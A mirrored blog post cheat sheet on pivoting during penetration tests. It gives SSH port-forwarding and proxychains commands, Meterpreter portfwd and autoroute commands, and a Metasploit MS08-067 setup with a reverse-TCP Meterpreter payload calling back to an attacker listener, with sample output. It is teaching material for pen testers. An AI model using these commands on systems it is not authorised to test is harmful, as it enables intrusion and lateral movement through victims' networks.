<!DOCTYPE HTML>
<html lang="en-US">

<!-- Mirrored from highon.coffee/blog/ssh-meterpreter-pivoting-techniques/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Dec 2022 15:34:15 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<script src="../../cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
<title>SSH & Meterpreter Pivoting Techniques</title>
<meta name="description" content="SSH / Meterpreter Pivoting techniques for use during penetration testing, allowing an attacker to route traffic through a compromised host in order to gain access to another subnet.">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="../../feed.xml">

<link rel="stylesheet" type="text/css" href="../../css/screen.css">

<link rel="icon" type="image/x-icon" href="../../favicon.ico">
<!--[if lt IE 9]>
  <script src="/js/html5shiv.min.js"></script>
  <script src="/js/respond.min.js"></script>
  <![endif]-->


</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="../../index.html">Home</a>
</li>
<li class="current">
<a href="../index.html">Blog</a>
</li>
<li class="">
<a href="../../about/index.html"><span class="hide-on-mobiles">About</span></a>
</li>
<li class="">
<a href="../../services/index.html"><span class="hide-on-mobiles">Services</span></a>
</li>
</ul>
</nav>
<div class="grid">
<div class="unit one-third center-on-mobiles">
<h1>
<a href="../../index.html">
<span>Zeroday</span>
<img src="../../img/highoncoffee.png" width="300" height="115" alt="Logo">
</a>
</h1>
</div>
<nav class="main-nav unit two-thirds hide-on-mobiles">
<ul>
<li class="">
<a href="../../index.html">Home</a>
</li>
<li class="current">
<a href="../index.html">Blog</a>
</li>
<li class="">
<a href="../../about/index.html"><span class="hide-on-mobiles">About</span></a>
</li>
<li class="">
<a href="../../services/index.html"><span class="hide-on-mobiles">Services</span></a>
</li>
</ul>
</nav>
</div>
</header>
<section class="blog">
<div class="grid">
<div class="docs-nav-mobile unit whole show-on-mobiles">
<select onchange="if (this.value) window.location.href=this.value">
<option value="">Navigate the blog…</option>
<option value="/blog/">Home</option>
<optgroup label="v1.x">
<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</option>
<option value="/blog/insecure-direct-object-reference-idor/">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</option>
<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet: Commands & Examples (2022)</option>
<option value="/blog/encrypted-note-taking-solution/">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</option>
<option value="/blog/dns-tunnel-dnscat2-cheat-sheet/">DNS Tunneling dnscat2 Cheat Sheet</option>
<option value="/blog/ssh-lateral-movement-cheat-sheet/">SSH Lateral Movement Cheat Sheet</option>
<option value="/blog/android-app-pen-testing-environment/">Android Pen Testing Environment Setup</option>
<option value="/blog/password-reset-security-testing-cheat-sheet/">Password Reset Testing Cheat Sheet</option>
<option value="/blog/ssrf-cheat-sheet/">SSRF Cheat Sheet & Bypass Techniques</option>
<option value="/blog/penetration-testing-tools-cheat-sheet/">Pen Testing Tools Cheat Sheet</option>
<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
<option value="/blog/vi-cheat-sheet/">Vim Cheat Sheet [2022 Update] + NEOVIM</option>
<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
</optgroup>
</select>
</div>
<div class="unit four-fifths">
<article>
<h2>
SSH & Meterpreter Pivoting Techniques
<a href="index.html" class="permalink" title="Permalink">∞</a>
</h2>
<span class="post-category">
<span class="label">
techniques
</span>
</span>
<div class="post-meta">
<span class="post-date">
20 Mar 2015
</span>
<a href="https://twitter.com/Arr0way" class="post-author">
<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
Arr0way
</a>
</div>
<div class="post-content">
<ul id="markdown-toc">
<li><a href="#what-is-pivoting-" id="markdown-toc-what-is-pivoting-">What is Pivoting ?</a></li>
<li><a href="#ssh-pivoting-cheatsheet" id="markdown-toc-ssh-pivoting-cheatsheet">SSH Pivoting Cheatsheet</a> <ul>
<li><a href="#ssh-port-forwarding" id="markdown-toc-ssh-port-forwarding">SSH Port Forwarding</a></li>
<li><a href="#ssh-port-forwarding-with-proxychains" id="markdown-toc-ssh-port-forwarding-with-proxychains">SSH Port Forwarding with Proxychains</a></li>
<li><a href="#using-proxychain-port-forwards" id="markdown-toc-using-proxychain-port-forwards">Using Proxychain port forwards</a></li>
</ul>
</li>
<li><a href="#configure-metasploit-to-use-a-ssh-pivot" id="markdown-toc-configure-metasploit-to-use-a-ssh-pivot">Configure Metasploit to use a SSH Pivot</a> <ul>
<li><a href="#dont-use-127001-with-metasploit" id="markdown-toc-dont-use-127001-with-metasploit">Don’t use 127.0.0.1 with Metasploit</a></li>
</ul>
</li>
<li><a href="#meterpreter-pivoting-cheatsheet" id="markdown-toc-meterpreter-pivoting-cheatsheet">Meterpreter Pivoting Cheatsheet</a></li>
<li><a href="#pivoting-example-diagrams" id="markdown-toc-pivoting-example-diagrams">Pivoting Example Diagrams</a> <ul>
<li><a href="#starting-point" id="markdown-toc-starting-point">Starting Point</a></li>
<li><a href="#routing-traffic-to-the-same-subnet" id="markdown-toc-routing-traffic-to-the-same-subnet">Routing Traffic to the Same Subnet</a> <ul>
<li><a href="#ssh-pivoting-using-proxychains" id="markdown-toc-ssh-pivoting-using-proxychains">SSH Pivoting using Proxychains</a></li>
<li><a href="#ssh-port-forwarding-command" id="markdown-toc-ssh-port-forwarding-command">SSH Port Forwarding Command</a></li>
</ul>
</li>
<li><a href="#ssh-and-meterpreter-pivoting" id="markdown-toc-ssh-and-meterpreter-pivoting">SSH and Meterpreter Pivoting</a> <ul>
<li><a href="#example-commands" id="markdown-toc-example-commands">Example commands</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="what-is-pivoting-">What is Pivoting ?</h2>
<p><strong>Pivoting</strong> is a technique used to route traffic through a compromised host on a penetration test.</p>
<p>When conducting an external penetration test you may need to route traffic through a compromised machine in order to compromise internal targets.</p>
<p><strong>Pivoting</strong>, allows you to leverage <a href="../penetration-testing-tools-cheat-sheet/index.html">pen test tools</a> on your attacking machine while routing traffic through other hosts on the subnet, and potentially allowing access to other subnets.</p>
<h2 id="ssh-pivoting-cheatsheet">SSH Pivoting Cheatsheet</h2>
<h3 id="ssh-port-forwarding">SSH Port Forwarding</h3>
<div class="mobile-side-scroller">
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p><code>ssh -L 9999:10.0.2.2:445 <a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="344147514674050d061a05020c1a061a060104">[email&#160;protected]</a></code></p>
</td>
<td>
<p>Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250</p>
</td>
</tr>
</tbody>
</table>
</div>
<h3 id="ssh-port-forwarding-with-proxychains">SSH Port Forwarding with Proxychains</h3>
<div class="mobile-side-scroller">
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p><code>ssh -D 127.0.0.1:9050 <a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="374558584377060e051906010f190519050207">[email&#160;protected]</a></code></p>
</td>
<td>
<p>Dynamically allows all port forwards to the subnets availble on the target.</p>
 </td>
</tr>
</tbody>
</table>
</div>
<div class="note warning">
<h5>Dynamic Proxychain Warning</h5>
<p>Dynamic Proxychain SSH port forwarding does not work with nmap and metasploits meterpreter shells won't spawn.</p>
</div>
<p>If you attempt to spawn a shell via Meterpreter, you’ll get an error similar to the following:</p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash">meterpreter <span class="o">&gt;</span> execute <span class="nt">-f</span> cmd.exe <span class="nt">-i</span> <span class="nt">-H</span>
|S-chain|-&lt;<span class="o">&gt;</span><span class="nt">-127</span>.0.0.1:9050-&lt;<span class="o">&gt;</span>&lt;<span class="o">&gt;</span><span class="nt">-127</span>.0.0.1:41713-&lt;<span class="nt">--timeout</span></code></pre></figure>
<h3 id="using-proxychain-port-forwards">Using Proxychain port forwards</h3>
<p>When using a Proxychain port forward, all commands need to be prefixed with the proxychain command, this instructs the application traffic to route through the proxy.</p>
<section class="shellbox">
<div class="unit golden-large code">
<p class="title">Connecting to RDP via Proxychains Dynamic Port Forwarding</p>
<div class="shell">
<p class="line">
<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
<span class="command">proxychains rdesktop TARGET-IP</span>
</p>
&lt;/p&gt;
</div>
</div>
</section>
<h2 id="configure-metasploit-to-use-a-ssh-pivot">Configure Metasploit to use a SSH Pivot</h2>
<p>The following is an example of how to configure Metersploit to use a SSH portward. In this example port 9999 is forwarded to the target and the attacking machine has an IP address of 192.168.2.100:</p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Setup the port forward <span class="o">(</span>instructions above<span class="o">)</span>, <span class="k">then </span>configure msfconsole as follows <span class="o">(</span>using MS08_067 <span class="k">in </span>this example<span class="o">)</span><span class="nb">.</span>

 msf exploit<span class="o">(</span>ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options

 Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:

    Name     Current Setting  Required  Description
    <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   RHOST    0.0.0.0          <span class="nb">yes       </span>The target address
    RPORT    9999             <span class="nb">yes       </span>Set the SMB service port
    SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>


 Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:

    Name      Current Setting  Required  Description
    <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>accepted: seh, thread, process, none<span class="o">)</span>
    LHOST     192.168.2.100   <span class="nb">yes       </span>The listen address
    LPORT     443              <span class="nb">yes       </span>The listen port


 Exploit target:

    Id  Name
    <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic Targeting</code></pre></figure>
<h3 id="dont-use-127001-with-metasploit">Don’t use 127.0.0.1 with Metasploit</h3>
<div class="note tip">
<h5>Update: You can now use 127.0.0.2</h5>
<p>Other 127.0.0.0 addresses can also be used (<code>127.0.0.3</code>,<code>127.0.0.4</code> etc), but not <code>127.0.0.1</code></p>
</div>
<p>The example above uses 0.0.0.0 <strong>Not 127.0.0.1</strong>, never use 127.0.0.1 with Metasploit or you’ll get the following error after you attempt to do anything post exploit:</p>
<figure class="highlight"><pre><code class="language-bash" data-lang="bash"> exploit<span class="o">(</span>ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> exploit

 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse handler on 192.168.14.183:443
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Automatically detecting the target...
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Fingerprint: Windows XP - Service Pack 3 - lang:English
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to trigger the vulnerability...
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>769536 bytes<span class="o">)</span> to 192.168.15.252

msf meterpreter <span class="o">&gt;</span> getuid
 <span class="o">[</span>-] Session manipulation failed: Validation failed: Address is reserved <span class="o">[</span><span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/validations.rb:56:in </span><span class="sb">`</span>save!<span class="s1">'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/attribute_methods/dirty.rb:33:in `save!'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:264:in <span class="sb">`</span><span class="s2">block in save!'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:313:in </span><span class="sb">`</span>block <span class="k">in </span>with_transaction_returning_status<span class="s1">'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/database_statements.rb:192:in `transaction'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:208:in <span class="sb">`</span><span class="s2">transaction'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:311:in </span><span class="sb">`</span>with_transaction_returning_status<span class="s1">'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:264:in `save!'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:377:in <span class="sb">`</span><span class="s2">block in report_host'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/connection_pool.rb:129:in </span><span class="sb">`</span>with_connection<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:323:in `report_host'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2031:in <span class="sb">`</span><span class="s2">block in report_event'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/connection_pool.rb:129:in </span><span class="sb">`</span>with_connection<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2025:in `report_event'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:222:in <span class="sb">`</span><span class="s2">report_event'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:331:in </span><span class="sb">`</span>session_event<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:408:in `block in on_session_output'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:407:in <span class="sb">`</span><span class="s2">each'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:407:in </span><span class="sb">`</span>on_session_output<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:183:in `block in method_missing'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in <span class="sb">`</span><span class="s2">each'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in </span><span class="sb">`</span>method_missing<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/session_manager.rb:242:in `block in register'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:271:in <span class="sb">`</span><span class="s2">call'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:271:in </span><span class="sb">`</span>print_error<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:436:in `unknown_command'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:411:in <span class="sb">`</span><span class="s2">run_single'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/post/meterpreter/ui/console.rb:68:in </span><span class="sb">`</span>block <span class="k">in </span>interact<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in `call'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in <span class="sb">`</span><span class="s2">run'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/post/meterpreter/ui/console.rb:66:in </span><span class="sb">`</span>interact<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/msf/base/sessions/meterpreter.rb:396:in `_interact'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/interactive.rb:49:in <span class="sb">`</span><span class="s2">interact'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/core.rb:1745:in </span><span class="sb">`</span>cmd_sessions<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in `run_command'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in <span class="sb">`</span><span class="s2">block in run_single'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in </span><span class="sb">`</span>each<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `run_single'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/exploit.rb:142:in <span class="sb">`</span><span class="s2">cmd_exploit'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in </span><span class="sb">`</span>run_command<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in `block in run_single'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in <span class="sb">`</span><span class="s2">each'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in </span><span class="sb">`</span>run_single<span class="s1">'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:200:in `run'</span><span class="s2">", "</span>/opt/metasploit/apps/pro/msf3/msfconsole:148:in <span class="sb">`</span><span class="s2">&lt;main&gt;'"</span><span class="o">]</span></code></pre></figure>
<h2 id="meterpreter-pivoting-cheatsheet">Meterpreter Pivoting Cheatsheet</h2>
<p>Assuming you’ve compromised the target machine and have a meterpreter shell, you can pivot through it by setting up a <strong>meterpreter port forward</strong>.</p>
<div class="mobile-side-scroller">
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p><code>portfwd add –l 3389 –p 3389 –r target-host</code></p>
</td>
<td>
<p>Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</p>
</td>
</tr>
<tr>
<td>
<p><code>portfwd delete –l 3389 –p 3389 –r target-host</code></p>
</td>
<td>
<p>Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</p>
</td>
</tr>
<tr>
<td>
<p><code>portfwd flush</code></p>
</td>
<td>
<p>Meterpreter delete all port forwards</p>
</td>
</tr>
<tr>
<td>
<p><code>portfwd list</code></p>
</td>
<td>
<p>Meterpreter list active port forwards</p>
</td>
</tr>
<tr>
<td>
<p><code>run autoroute -s 192.168.15.0/24</code></p>
</td>
<td>
<p>Use Meterpreters autoroute script to add the route for specified subnet <code>192.168.15.0</code></p>
</td>
</tr>
<tr>
<td>
<p><code>run autoroute -p</code></p>
</td>
<td>
<p>Meterpreter list all active routes</p>
</td>
</tr>
<tr>
<td>
<p><code>route</code></p>
</td>
<td>
<p>Meterpreter view available networks the compromised host can access</p>
</td>
</tr>
<tr>
<td>
<p><code>route add 192.168.14.0 255.255.255.0 3</code></p>
</td>
<td>
<p>Meterpreter add route for 192.168.14.0/24 via Session 3.</p>
</td>
</tr>
<tr>
<td>
<p><code>route delete 192.168.14.0 255.255.255.0 3</code></p>
</td>
<td>
<p>Meterpreter delete route for 192.168.14.0/24 via Session 3.</p>
</td>
</tr>
<tr>
<td>
<p><code>route flush</code></p>
</td>
<td>
<p>Meterpreter delete all routes</p>
</td>
</tr>
</tbody>
</table>
</div>
<div class="note info">
<h5>Meterpreter Port Forwards are flakey</h5>
<p>Meterpreter port forwards can be a bit flakey, also the meterpreter session needs to be remain open.</p>
</div>
<p>In order to connect to the compromised machine you would run:</p>
<section class="shellbox">
<div class="unit golden-large code">
<p class="title">Connect to RDP via Meterpreter Port Forward</p>
<div class="shell">
<p class="line">
<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
<span class="command">rdesktop 127.0.0.1</span>
</p>
&lt;/p&gt;
</div>
</div>
</section>
<h2 id="pivoting-example-diagrams">Pivoting Example Diagrams</h2>
<p>Pivoting can be a bit hard to understand on paper, so here are some diagrams for clarification with the associated commands.</p>
<p><img src="https://i.imgur.com/UVoxUFl.png" alt="Brace for Wonky Visio Arrows" /></p>
<h3 id="starting-point">Starting Point</h3>
<p>You’ll need to have access to a compromised machine on the target network, depending on the compromised machines configuration you may or may not need root.</p>
<p><img src="https://i.imgur.com/zRIqADW.png" alt="SSH Pivot Example 1: Starting Point" /></p>
<h3 id="routing-traffic-to-the-same-subnet">Routing Traffic to the Same Subnet</h3>
<p><img src="https://i.imgur.com/TXV6ehn.png" alt="Pivot Example 2: Routing traffic to the same subnet" /></p>
<p>####Example commands</p>
<h5 id="ssh-pivoting-using-proxychains">SSH Pivoting using Proxychains</h5>
<section class="shellbox">
<div class="unit golden-large code">
<p class="title">Dynamic SSH Pivoting Command using proxy chains</p>
<div class="shell">
<p class="line">
<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
 <span class="command">ssh -D 127.0.0.1:9050 <a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="89fbe6e6fdc9b8b0bba7b8bfb1a7bba7bb">[email&#160;protected]</a></span>
</p>
&lt;/p&gt;
</div>
</div>
</section>
<p>You could then connect to Target 2’s RDP server using:</p>
<section class="shellbox">
<div class="unit golden-large code">
<p class="title">Connecting to RDP via Proxychains Dynamic Port Forwarding</p>
<div class="shell">
<p class="line">
<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
<span class="command">proxychains rdesktop 192.168.2.3</span>
</p>
&lt;/p&gt;
</div>
</div>
</section>
<h5 id="ssh-port-forwarding-command">SSH Port Forwarding Command</h5>
<section class="shellbox">
<div class="unit golden-large code">
<p class="title">RDP SSH Port Forwarding</p>
<div class="shell">
<p class="line">
<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
<span class="command">ssh -L 3389:192.168.2.3:3389 <a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="196c6a7c6b5928202b37282f21372b372b">[email&#160;protected]</a></span>
</p>
&lt;/p&gt;
</div>
</div>
</section>
<p>You could then connect to Target 2’s RDP server using:</p>
<section class="shellbox">
<div class="unit golden-large code">
<p class="title">Connecting to RDP via SSH Port Forwarding</p>
<div class="shell">
<p class="line">
<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
<span class="command">rdesktop 127.0.0.1</span>
</p>
&lt;/p&gt;
</div>
</div>
</section>
<h3 id="ssh-and-meterpreter-pivoting">SSH and Meterpreter Pivoting</h3>
<p>This example uses SSH pivoting and Meterpreter port forwarding to access machines on subnet 2.</p>
<p><img src="https://i.imgur.com/gyylQup.png" alt="Pivot Example 3: Using SSH and Meterpreter Pivoting to access another subnet" /></p>
<h4 id="example-commands">Example commands</h4>
<p>The above commands would be leveraged to reach <strong>Target 2</strong>, from <strong>Target 2</strong> to <strong>Target 3</strong>, meterpreter would be used. Follow the <a href="index.html#meterpreter-pivoting-cheatsheet">meterpreter portwarding example</a> above for a MS08-067 example.</p>
<p>If this was helpfull, click tweet below.</p>
<p>Enjoy.</p>
</div>
<section class="share-box">
<div class="grid">
<div class="unit whole">
<div class="grid pane">
<div class="unit whole center-on-mobiles">
<div class="pane-content">
<h2>Share this on...</h2>
<p><a href="https://twitter.com/intent/tweet?text=SSH%20&amp;%20Meterpreter%20Pivoting%20Techniques&amp;url=https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
<a href="https://plus.google.com/share?url=https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/&amp;title=SSH%20&amp;%20Meterpreter%20Pivoting%20Techniques" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
<h2><br>Follow Arr0way</h2>
<p><a href="https://infosec.exchange/@Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Mastodon"><i class="fa fa-twitter-square" aria-hidden="true"></i> Mastodon</a>
<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
<p><br></p>
</div>
</div>
<h2><br>Also... <br> <br>You might want to read these</h2>
</div>
</div>
</section>
<div class="mobile-side-scroller">
<table>
<thead>
<tr>
<th>Category</th>
<th>Post Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a></b></p></pc>
</td>
</tr>
<tr>
<td>
